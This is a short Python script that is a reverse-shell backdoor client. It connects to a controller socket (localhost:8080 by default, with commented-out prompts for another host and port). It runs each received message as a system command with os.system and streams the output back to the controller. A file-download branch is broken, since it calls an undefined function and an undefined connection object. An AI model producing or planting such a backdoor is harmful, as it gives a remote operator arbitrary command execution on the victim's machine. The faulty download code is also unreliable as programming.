import time
import sys
import socket
import os
s = socket.socket()
_host = "localhost"#str(input("set host> "))
host = _host
port = 8080 #int(input("set port> "))

s.connect((host, port))

print("\033[92m\033[mConnected\033[0m")
_x = 4
while _x == 4 :
	msg = s.recv(1024)
	msg = msg.decode()
	cmd_array = msg.split()
	def _send(_file):
		f = open(_file, 'wb')
			
			#while (True):
			#l = conn.recv(1024)
			
		m = 1
		while m == 1:
			#f.write(l)
			l = conn.recv(1024)
			f.write(l)
			if len(l) < 1024:
				m = 2
			
	if (msg == "/"):
		_x += 10
		print("[-] Session closed!")
	elif (msg == "dump_ss"):
		print("elseif")
	elif (str(cmd_array[0]) == "download"):
		send(cmd_array[1])
	else:
		os.system(msg + ">data.txt")
		f = open("data.txt", "rb")
		l = f.read(1024)
		print(str(l))	
		while (l):
			s.send(l)
			l = f.read(1024)
			print(str(l))
		
		#s.close()
		#s.send("close".encode())
		f.close()
		
		print(str(l))
		s.send(l)
